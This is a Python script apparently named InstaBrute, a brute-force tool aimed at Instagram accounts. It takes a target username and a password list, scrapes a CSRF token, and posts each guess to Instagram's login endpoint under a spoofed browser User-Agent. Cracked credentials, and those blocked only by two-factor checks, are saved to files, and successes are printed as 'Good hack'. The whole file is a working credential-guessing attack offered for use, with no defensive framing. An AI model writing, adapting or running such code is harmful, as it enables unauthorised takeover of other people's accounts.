from __future__ import print_function
import requests
import sys
import re
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class InstaBrute(object):
    def __init__(self):
        try:
            self.user = input('username: ')
            combo_file = input('passList: ')
        except KeyboardInterrupt:
            print('\nThe tool was interrupted. Exiting...')
            sys.exit()

        with open(combo_file, 'r') as file:
            combolist = file.read().splitlines()

        for combo in combolist:
            password = combo.split(':')[0]
            self.new_br(password)

    def new_br(self, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        timestamp = int(datetime.now().timestamp())

        payload = {
            'username': self.user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as session:
            try:
                response = session.get(link)
                csrf = re.findall(r"csrf_token\":\"(.*?)\"", response.text)[0]
                response = session.post(login_url, data=payload, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf
                })

                print(f'{self.user}:{pwd}\n----------------------------')

                if 'authenticated": true' in response.text:
                    print(Fore.GREEN + f'{self.user}:{pwd} --> Good hack' + Style.RESET_ALL)
                    with open('good.txt', 'a') as file:
                        file.write(f'{self.user}:{pwd}\n')
                elif 'two_factor_required' in response.text:
                    print(Fore.YELLOW + f'{self.user}:{pwd} --> Good, it needs to be checked' + Style.RESET_ALL)
                    with open('results_NeedVerify.txt', 'a') as file:
                        file.write(f'{self.user}:{pwd}\n')
                else:
                    print(Fore.RED + f'{self.user}:{pwd} --> Bad password' + Style.RESET_ALL)

            except Exception as e:
                print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    print('''

  _____           _          _                _               __                   
 |_   _|         | |        | |              | |             / _|                  
   | |  _ __  ___| |_ __ _  | |__  _ __ _   _| |_ ___ ______| |_ ___  _ __ ___ ___ 
   | | | '_ \/ __| __/ _` | | '_ \| '__| | | | __/ _ \______|  _/ _ \| '__/ __/ _ |
  _| |_| | | \__ \ || (_| | | |_) | |  | |_| | ||  __/      | || (_) | | | (_|  __/
 |_____|_| |_|___/\__\__,_| |_.__/|_|   \__,_|\__\___|      |_| \___/|_|  \___\___|
                    v0.1(stable version)                                                                             
                                                                                                                                                           
''')
    InstaBrute()
